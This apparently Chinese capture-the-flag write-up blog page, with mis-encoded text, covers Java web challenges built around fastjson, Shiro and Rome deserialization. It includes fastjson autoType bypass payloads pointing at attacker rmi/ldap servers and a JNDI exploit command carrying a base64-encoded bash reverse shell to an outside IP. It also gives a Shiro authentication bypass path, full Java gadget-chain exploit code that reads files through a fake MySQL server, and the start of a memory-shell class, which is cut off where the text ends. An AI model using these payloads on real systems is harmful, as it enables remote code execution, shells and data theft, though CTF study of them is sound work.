title="é¦™å±±æ¯easy_fastjson"></a>é¦™å±±æ¯easy_fastjson</h2><p>åç¼–è¯‘jaråŒ…å‘ç°fastjson1.2.42ä¾èµ–</p><p><a href="https://imgse.com/i/pprzIyV"><img src="https://s1.ax1x.com/2023/03/26/pprzIyV.png" alt="pprzIyV.png"></a></p><p>ä¸¤ä¸ªè·¯ç”±</p><p><a href="https://imgse.com/i/ppsSUmT"><img src="https://s1.ax1x.com/2023/03/26/ppsSUmT.png" alt="ppsSUmT.png"></a></p><p><code>hackme</code>çš„è·¯ç”±å¤„ç†æ–¹æ³•</p><p>é€šè¿‡ParserConfig.getGlobalInstance().setAutoTypeSupport(true)å¯ç”¨fastjsonçš„è‡ªåŠ¨ç±»å‹æ”¯æŒã€‚è¿™æ„å‘³ç€fastjsonå°†å°è¯•æ ¹æ®JSONæ•°æ®ä¸­çš„â€@typeâ€å±æ€§è‡ªåŠ¨ååºåˆ—åŒ–Javaå¯¹è±¡ã€‚</p><p>æ¥ç€ï¼Œè¯¥æ–¹æ³•ä½¿ç”¨å­—ç¬¦ä¸²æ›¿æ¢æ“ä½œå¯¹payloadè¿›è¡Œäº†ä¸€äº›è¿‡æ»¤ï¼Œä»¥é˜²æ­¢æ¶æ„çš„è¾“å…¥å­—ç¬¦ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒå°†â€\u004câ€å’Œâ€\x4câ€æ›¿æ¢ä¸ºâ€Lâ€ï¼Œå°†â€\u003bâ€å’Œâ€\x3bâ€æ›¿æ¢ä¸ºâ€;â€ï¼Œå¹¶ç§»é™¤æ¢è¡Œç¬¦å’Œå›è½¦ç¬¦ã€‚</p><p>ç„¶ååˆ©ç”¨dont_want_bypass_me()è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦</p><p>æœ€åï¼Œç”¨fastjsonçš„JSON.parse()ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">dont_want_bypass_me</span><span class="params">(String cls_name)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cls_name.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; cls_name.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">                cls_name = cls_name.substring(<span class="number">1</span>, cls_name.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cls_name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å†™20éå°±è¡Œäº†</p><p><code>getflag</code>è·¯ç”±</p><p>åªè¦å­˜åœ¨<code>/tmp/i_want_flag</code>å°±å¯ä»¥è·å¾—flag</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;&quot;@type&quot;:&quot;LLLLLLLLLLLLLLLLLLLLLLcom.sun.rowset.JdbcRowSetImpl;;;;;;;;;;;;;;;;;;;;;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://xx.xx.xx.xx:1099/lvvtee&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ¶æ„IdapæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/i_want_flag&quot; -A ip</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pps93Mq"><img src="https://s1.ax1x.com/2023/03/26/pps93Mq.png" alt="pps93Mq.png"></a></p><p><a href="https://imgse.com/i/pps9sL6"><img src="https://s1.ax1x.com/2023/03/26/pps9sL6.png" alt="pps9sL6.png"></a></p><h2 id="ç¥¥äº‘æ¯-å±‚å±‚ç©¿é€"><a href="#ç¥¥äº‘æ¯-å±‚å±‚ç©¿é€" class="headerlink" title="ç¥¥äº‘æ¯ å±‚å±‚ç©¿é€"></a>ç¥¥äº‘æ¯ å±‚å±‚ç©¿é€</h2><p>å‘ç°fastjson1.2.24å’Œshiro1.4.0ä¾èµ–</p><p><a href="https://imgse.com/i/ppsCvND"><img src="https://s1.ax1x.com/2023/03/26/ppsCvND.png" alt="ppsCvND.png"></a></p><p>è¿‡æ»¤äº†ä¸¤ä¸ªç±»ï¼Œ16è¿›åˆ¶å’Œ<code>unicode</code>ç¼–ç </p><p><a href="https://imgse.com/i/ppsP9gA"><img src="https://s1.ax1x.com/2023/03/26/ppsP9gA.png" alt="ppsP9gA.png"></a></p><p>éœ€è¦å…ˆç»•è¿‡shiroç™»å½•éªŒè¯ï¼Œ<strong>CVE-2020-1957</strong>å’Œ<strong>CVE-2020-2957</strong>éƒ½å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/test/</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppsAdJO"><img src="https://s1.ax1x.com/2023/03/26/ppsAdJO.png" alt="ppsAdJO.png"></a></p><p>åé¢å‘ç°å‘Šè¯‰äº†å¯†ç ï¼š123456</p><p><a href="https://imgse.com/i/ppsABSe"><img src="https://s1.ax1x.com/2023/03/26/ppsABSe.png" alt="ppsABSe.png"></a></p><p>ç™»é™†åæ‹¿cookieä¹Ÿå¯ä»¥</p><p>æ¥ä¸‹æ¥å°±æ˜¯fastjson1.2.24ååºåˆ—åŒ–çš„åˆ©ç”¨ï¼Œå‘ç°è¿‡æ»¤äº†å¸¸ç”¨çš„<code>JdbcRowSetImpl, TemplatesImpl</code>è¿™ä¸¤ä¸ªç±»</p><p>å‘ç°åœ¨libé‡Œé¢æœ‰<code>hibernate-c3p0-5.3.14.Final.jar</code></p><p><a href="https://imgse.com/i/ppsA5lQ"><img src="https://s1.ax1x.com/2023/03/26/ppsA5lQ.png" alt="ppsA5lQ.png"></a></p><p>æ‰€ä»¥å¯ä»¥ç”¨c3p0ç»“åˆfastjsonæ¥æ‰“</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/test/ HTTP/1.1</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;ldap://81.70.221.206:1389/yd88og&quot;,&quot;loginTimeout&quot;:0,&quot;f&quot;:&quot;a*20000&quot;,&quot;enotaie98l9&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ¶æ„IdapæœåŠ¡ç›´æ¥åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjcwLjIyMS4yMDYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 81.70.221.206</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppsE9mR"><img src="https://s1.ax1x.com/2023/03/26/ppsE9mR.png" alt="ppsE9mR.png"></a></p><p><a href="https://imgse.com/i/ppsEC01"><img src="https://s1.ax1x.com/2023/03/26/ppsEC01.png" alt="ppsEC01.png"></a></p><h2 id="å®‰æ´µæ¯easyja"><a href="#å®‰æ´µæ¯easyja" class="headerlink" title="å®‰æ´µæ¯easyja"></a>å®‰æ´µæ¯easyja</h2><p>ç›´æ¥æœ‰ååºåˆ—åŒ–çš„ç‚¹</p><p><a href="https://imgse.com/i/ppgLZhd"><img src="https://s1.ax1x.com/2023/03/30/ppgLZhd.png" alt="ppgLZhd.png"></a></p><p>pom.xmlæœ‰romeä¾èµ–</p><p><a href="https://imgse.com/i/ppgL8Ag"><img src="https://s1.ax1x.com/2023/03/30/ppgL8Ag.png" alt="ppgL8Ag.png"></a></p><p>ä½†æ˜¯åœ¨SecurityObjectInpitStreamé‡Œè¿‡æ»¤äº†å‡ ä¸ªå…³é”®ç±»</p><p><a href="https://imgse.com/i/ppgjT5F"><img src="https://s1.ax1x.com/2023/03/30/ppgjT5F.png" alt="ppgjT5F.png"></a></p><ul><li>è¿‡æ»¤äº†å¸¸è§„Romeé“¾è°ƒç”¨toStringçš„ç±»ï¼šBadAttributeValueExpExceptionï¼ŒObjectBeanï¼ŒEqualsBean</li><li>è¿‡æ»¤äº†åé¢å‡ ä¸ªç±»é˜²æ­¢å¸¸è§„çš„å‘½ä»¤æ‰§è¡Œ</li></ul><p>åœ¨Connectionä¸­çš„Databaseç±»å‘ç°ä¸€ä¸ªgetterèƒ½å¤Ÿè°ƒç”¨æ•°æ®åº“è¿æ¥ï¼Œé€ æˆjdbcæ”»å‡»ï¼Œåœ¨romeé“¾ä¸­æœ€åèƒ½å¤Ÿè°ƒç”¨ä»»æ„getter</p><p><a href="https://imgse.com/i/ppgvtaT"><img src="https://s1.ax1x.com/2023/03/30/ppgvtaT.png" alt="ppgvtaT.png"></a></p><p>åŒæ ·æœ‰ä¸€ä¸ªè¿‡æ»¤ï¼Œè¿‡æ»¤äº†urlä¸­çš„ä¸€äº›å…³é”®å­—ï¼Œä½†æ˜¯ç»æµ‹è¯•å¯ä»¥ç”¨ç¼–ç ç»•è¿‡â€¦</p><p><a href="https://imgse.com/i/ppgvwRJ"><img src="https://s1.ax1x.com/2023/03/30/ppgvwRJ.png" alt="ppgvwRJ.png"></a></p><p>æ‰€ä»¥ç°åœ¨åªéœ€æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨toStringçš„ç‚¹</p><p>å¯ä»¥ç”¨<code>SpringPartiallyComparableAdvisorHolder</code>é“¾</p><p>gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap#readObject</span><br><span class="line">java.util.HashMap#putVal</span><br><span class="line">org.springframework.aop.target.HotSwappableTargetSource#equals</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals</span><br><span class="line">com.rometools.rome.feed.impl.ToStringBean#toString</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨XStringçš„equalsæ–¹æ³•ä¸­èƒ½å¤Ÿè°ƒç”¨ä»»æ„ç±»çš„toStringæ–¹æ³•</p><p><a href="https://imgse.com/i/ppjVlfH"><img src="https://s1.ax1x.com/2023/04/12/ppjVlfH.png" alt="ppjVlfH.png"></a></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç®€å•çš„æ„é€ ï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezjaba;</span><br><span class="line"><span class="keyword">import</span> com.example.ezjaba.Connection.Database;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">main</span>   <span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Database database=<span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">        database.setDatabase(<span class="string">&quot;%6d%79%73%71%6c://81.70.221.206:3306/test?user=fileread_file:///flag&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Database.class, database);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//ä¸ºäº†é˜²æ­¢æå‰è°ƒç”¨åˆ©ç”¨é“¾ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨HashMap.put</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream1=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objectOutputStream1=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream1);</span><br><span class="line">        objectOutputStream1.writeUTF(<span class="string">&quot;axb&quot;</span>);</span><br><span class="line">        objectOutputStream1.writeInt(<span class="number">2022</span>);</span><br><span class="line"></span><br><span class="line">        objectOutputStream1.writeObject(s);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream1.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼š</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Database</span> <span class="variable">database</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Database</span>();</span><br><span class="line">        database.setDatabase(<span class="string">&quot;mysql://127.0.0.1:3306/test?user=fileread_file:///d:/&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(database.getClass(), database);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>,toStringBean1);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>,xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>,xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>MySQL_Fake_Server</code>æˆåŠŸè¯»å–flag</p><p><a href="https://imgse.com/i/ppjV27T"><img src="https://s1.ax1x.com/2023/04/12/ppjV27T.png" alt="ppjV27T.png"></a>              </p><h2 id="å®‰æ´µæ¯fastjson"><a href="#å®‰æ´µæ¯fastjson" class="headerlink" title="å®‰æ´µæ¯fastjson"></a>å®‰æ´µæ¯fastjson</h2><p>fastjson1.2.47ä¾èµ–</p><p><a href="https://imgse.com/i/ppcCpV0"><img src="https://s1.ax1x.com/2023/03/28/ppcCpV0.png" alt="ppcCpV0.png"></a></p><p>æœ‰ä¸¤ä¸ªè¿‡æ»¤</p><p><a href="https://imgse.com/i/ppcCFGF"><img src="https://s1.ax1x.com/2023/03/28/ppcCFGF.png" alt="ppcCFGF.png"></a></p><p>ç„¶åæœ‰ä¸ªjavaBean</p><p><a href="https://imgse.com/i/ppcCUdP"><img src="https://s1.ax1x.com/2023/03/28/ppcCUdP.png" alt="ppcCUdP.png"></a></p><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                 <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">                 <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;App.Exec&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">             <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;App.Exec&quot;</span><span class="punctuation">,</span></span><br><span class="line">             <span class="attr">&quot;ClassByte&quot;</span><span class="punctuation">:</span> <span class="string">&quot;......&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸å‡ºç½‘ï¼Œå†™å†…å­˜ğŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span 